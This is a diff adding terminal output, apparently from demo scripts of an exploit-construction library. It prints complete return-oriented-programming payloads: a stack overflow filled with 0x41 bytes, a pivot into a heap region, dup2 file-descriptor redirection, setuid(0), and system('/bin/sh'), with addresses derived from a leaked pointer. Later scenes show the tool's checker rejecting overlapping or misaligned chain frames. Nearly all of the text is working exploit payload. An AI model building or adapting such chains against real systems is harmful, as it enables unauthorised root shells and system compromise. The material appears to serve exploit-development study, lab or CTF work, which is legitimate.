@@ -1,0 +1,80 @@
+$ python3 before.py
+before slab: e0124c2f6e550000e5a3beba1f7f0000040000000000000051bebeba1f7f000000000000000000000000000000000000b0b0caba1f7f0000d1b9c0ba1f7f000020134c2f6e550000e5a3beba1f7f0000040000000000000051bebeba1f7f000001000000000000000000000000000000b0b0caba1f7f0000d1b9c0ba1f7f00000000000000000000e5a3beba1f7f000048134c2f6e550000d69cbeba1f7f00009022c1ba1f7f00002f62696e2f7368000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+before stack: 41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141a0124c2f6e550000d1b9c0ba1f7f0000
+
+$ python3 after.py
+after slab: e0124c2f6e550000e5a3beba1f7f0000040000000000000051bebeba1f7f000000000000000000000000000000000000b0b0caba1f7f0000d1b9c0ba1f7f000020134c2f6e550000e5a3beba1f7f0000040000000000000051bebeba1f7f000001000000000000000000000000000000b0b0caba1f7f0000d1b9c0ba1f7f00000000000000000000e5a3beba1f7f000048134c2f6e550000d69cbeba1f7f00009022c1ba1f7f00002f62696e2f7368000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+after stack: 41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141a0124c2f6e550000d1b9c0ba1f7f0000
+
+$ python3 enhanced.py
+enhanced slab: e0124c2f6e550000e5a3beba1f7f0000040000000000000051bebeba1f7f000000000000000000000000000000000000b0b0caba1f7f0000d1b9c0ba1f7f000020134c2f6e550000e5a3beba1f7f0000040000000000000051bebeba1f7f000001000000000000000000000000000000b0b0caba1f7f0000d1b9c0ba1f7f00000000000000000000e5a3beba1f7f000048134c2f6e550000d69cbeba1f7f00009022c1ba1f7f00002f62696e2f7368000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+enhanced stack: 41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141a0124c2f6e550000d1b9c0ba1f7f0000
+
+$ python3 check.py
+byte-for-byte equal: 336 bytes across 2 buffers (after.py and enhanced.py both match before.py)
+
+$ python3 refusal.py
+== scene 1: emit before either leak -- every waiting cell says so ==
+16 cells wait across 2 regions: 12 on libc_base, 4 on slab_base
+  slab.stdin.next_rbp (slab+0x00 w8) awaits slab_base
+  slab.stdout.next_rbp (slab+0x40 w8) awaits slab_base
+  slab.shell.binsh (slab+0x90 w8) awaits slab_base
+  stack.smash.rbp (stack+0x40 w8) awaits slab_base
+refused at bind: bind libc_base=0x7f1fbabc00 violates the declared alignment 0x1000 -- a mis-parsed leak? (see expect_sym)
+after two binds: 0 fixups left
+stack.smash.rbp (smash[+0x0]) @ stack+0x40
+cell: slab_base width=8 deliver=NORMAL
+bound: slab_base = 0x556e2f4c12a0 (source: note[2] stale-ptr print)
+== scene 2: the exploit grows -- root first, then the shell ==
+slab before: stdin@+0x00  stdout@+0x40  shell@+0x80  sh@+0xa8
+slab after:  stdin@+0x00  stdout@+0x40  shell@+0x80  sh@+0xa8  setuid@+0xb0
+slab.setuid.next_rbp (setuid[+0x0]) @ slab+0xB0 [abs 0x556E2F4C1350]
+cell: slab_base + 0x80 width=8 deliver=NORMAL
+bound: slab_base = 0x556e2f4c12a0 (source: note[2] stale-ptr print)
+the whole edit: one alloc, two re-links; every address above derived
+the grown payload, every qword attributed:
+region slab (base=slab_base, fill=0x00)
+  +0x0000 w8 e0124c2f6e550000  [slab.stdin.next_rbp]
+  +0x0008 w8 e5a3beba1f7f0000  [slab.stdin.pop_rdi]
+  +0x0010 w8 0400000000000000  [slab.stdin.oldfd]
+  +0x0018 w8 51bebeba1f7f0000  [slab.stdin.pop_rsi]
+  +0x0020 w8 0000000000000000  [slab.stdin.newfd]
+  +0x0028 w8 0000000000000000  [slab.stdin.r15]
+  +0x0030 w8 b0b0caba1f7f0000  [slab.stdin.dup2]
+  +0x0038 w8 d1b9c0ba1f7f0000  [slab.stdin.hop]
+  +0x0040 w8 50134c2f6e550000  [slab.stdout.next_rbp]
+  +0x0048 w8 e5a3beba1f7f0000  [slab.stdout.pop_rdi]
+  +0x0050 w8 0400000000000000  [slab.stdout.oldfd]
+  +0x0058 w8 51bebeba1f7f0000  [slab.stdout.pop_rsi]
+  +0x0060 w8 0100000000000000  [slab.stdout.newfd]
+  +0x0068 w8 0000000000000000  [slab.stdout.r15]
+  +0x0070 w8 b0b0caba1f7f0000  [slab.stdout.dup2]
+  +0x0078 w8 d1b9c0ba1f7f0000  [slab.stdout.hop]
+  +0x0080 w8 0000000000000000  [slab.shell.rbp]
+  +0x0088 w8 e5a3beba1f7f0000  [slab.shell.pop_rdi]
+  +0x0090 w8 48134c2f6e550000  [slab.shell.binsh]
+  +0x0098 w8 d69cbeba1f7f0000  [slab.shell.align]
+  +0x00a0 w8 9022c1ba1f7f0000  [slab.shell.system]
+  +0x00a8 w8 2f62696e2f736800  [slab.sh.s]
+  +0x00b0 w8 20134c2f6e550000  [slab.setuid.next_rbp]
+  +0x00b8 w8 e5a3beba1f7f0000  [slab.setuid.pop_rdi]
+  +0x00c0 w8 0000000000000000  [slab.setuid.uid]
+  +0x00c8 w8 7059caba1f7f0000  [slab.setuid.setuid]
+  +0x00d0 w8 d1b9c0ba1f7f0000  [slab.setuid.hop]
+region stack (base=stack_base, fill=0x41)
+  +0x0040 w8 a0124c2f6e550000  [stack.smash.rbp]
+  +0x0048 w8 d1b9c0ba1f7f0000  [stack.smash.rip]
+== scene 3: THE COLLISION -- the same frame at a hand-guessed offset ==
+refused:
+  final emit refused: check errors:
+  check: 5 errors, 0 warnings, 0 pending
+  ERROR CHK-001 [slab.shell, slab.setuid2]: placement extents overlap without a declared alias  hint: declare intent: region.at(..., over=(other,), why=...)
+  ERROR CHK-008 [slab.shell.align, slab.setuid2.setuid]: cell rewritten by a different owner (last-writer-wins)  hint: if intended: layout.allow_rewrite(cell, reason=...); else fix the collision
+  ERROR CHK-008 [slab.shell.binsh, slab.setuid2.uid]: cell rewritten by a different owner (last-writer-wins)  hint: if intended: layout.allow_rewrite(cell, reason=...); else fix the collision
+  ERROR CHK-008 [slab.shell.pop_rdi, slab.setuid2.pop_rdi]: cell rewritten by a different owner (last-writer-wins)  hint: if intended: layout.allow_rewrite(cell, reason=...); else fix the collision
+  ERROR CHK-008 [slab.shell.system, slab.setuid2.hop]: cell rewritten by a different owner (last-writer-wins)  hint: if intended: layout.allow_rewrite(cell, reason=...); else fix the collision
+two beliefs about where the shell frame lives cannot coexist past the gate
+== scene 4: THE ALIGNMENT FOLD -- grow the checked chain, and rsp parity flips ==
+  ERROR CHK-207 [frames.setuid, SetuidCall]: SetuidCall uses entry_sp_mod=8, but this position in the chain requires entry_sp_mod=0 (SP % 16 at entry)
+aligned: enter@+0x00  oldfd0@+0x10  newfd0@+0x20  dup2_0@+0x38  pivot0@+0x40  oldfd1@+0x50  newfd1@+0x60  dup2_1@+0x78  pivot1@+0x80  uid@+0x90  align_setuid@+0xa0  setuid@+0xa8  cmd@+0xb0  align_system@+0xc0  finish@+0xc8  sh@+0xc8
+by hand this is the SIGSEGV *inside* system; the fold does the mod-16 arithmetic instead
